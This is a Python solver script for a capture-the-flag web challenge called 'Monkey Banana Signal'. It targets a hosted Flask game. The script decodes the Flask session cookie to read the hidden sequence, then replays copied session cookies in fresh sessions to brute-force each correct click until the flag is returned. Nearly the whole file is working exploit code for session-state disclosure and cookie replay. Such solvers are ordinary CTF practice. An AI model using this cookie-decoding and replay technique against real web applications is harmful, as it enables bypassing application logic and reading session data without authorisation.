import requests
import json
import base64

BASE_URL = "https://banana-2-2nqw.onrender.com"

def decode_session_cookie(session_cookie):
    """Decode the Flask session cookie to extract the sequence"""
    parts = session_cookie.split('.')
    payload = parts[0]
    padding = 4 - (len(payload) % 4)
    if padding != 4:
        payload += '=' * padding
    
    try:
        decoded = base64.urlsafe_b64decode(payload)
        return json.loads(decoded)
    except Exception as e:
        return None

def solve():
    """Learn the banana->position mapping and solve the game"""
    session = requests.Session()
    
    # Start new game
    print("🎮 Starting new game...")
    response = session.post(f"{BASE_URL}/api/new")
    session_cookie = session.cookies.get('session')
    data = decode_session_cookie(session_cookie)
    
    sequence = data.get('sequence', [])
    print(f"📜 Sequence from cookie: {sequence}")
    print(f"🎯 Game length: {len(sequence)} steps\n")
    
    banana_to_position = {}
    
    # For each step, brute force to find the correct position
    for step in range(len(sequence)):
        signal_response = session.get(f"{BASE_URL}/api/signal")
        signal = signal_response.json()
        
        if signal.get('done'):
            break
        
        banana = signal.get('banana')
        
        # If we already know this banana's position, use it
        if banana in banana_to_position:
            position = banana_to_position[banana]
            print(f"Step {step+1}: Banana={banana} → Position={position}")
            
            click_response = session.post(f"{BASE_URL}/api/click",
                                         json={"clicked": position},
                                         headers={"Content-Type": "application/json"})
            result = click_response.json()
            
            if result.get('done') and result.get('flag'):
                print(f"\n🎉 FLAG: {result['flag']}")
                return result['flag']
        else:
            # Need to learn this banana's position
            print(f"Step {step+1}: Banana={banana} → Learning...")
            
            current_cookie = session.cookies.get('session')
            
            for pos in range(1, 10):
                test_session = requests.Session()
                test_session.cookies.set('session', current_cookie)
                
                click_response = test_session.post(f"{BASE_URL}/api/click",
                                                   json={"clicked": pos},
                                                   headers={"Content-Type": "application/json"})
                result = click_response.json()
                
                if result.get('correct'):
                    banana_to_position[banana] = pos
                    print(f"         Banana={banana} → Position={pos} ✓")
                    
                    session.post(f"{BASE_URL}/api/click",
                                json={"clicked": pos},
                                headers={"Content-Type": "application/json"})
                    
                    if result.get('done') and result.get('flag'):
                        print(f"\n🎉 FLAG: {result['flag']}")
                        return result['flag']
                    break
    
    return None

if __name__ == "__main__":
    print("="*60)
    print("       Monkey Banana Signal CTF Solver")
    print("="*60)
    print()
    
    flag = solve()
    
    if flag:
        print(f"\n🚩 FINAL FLAG: {flag}")
    else:
        print("\n⚠ Could not capture flag")
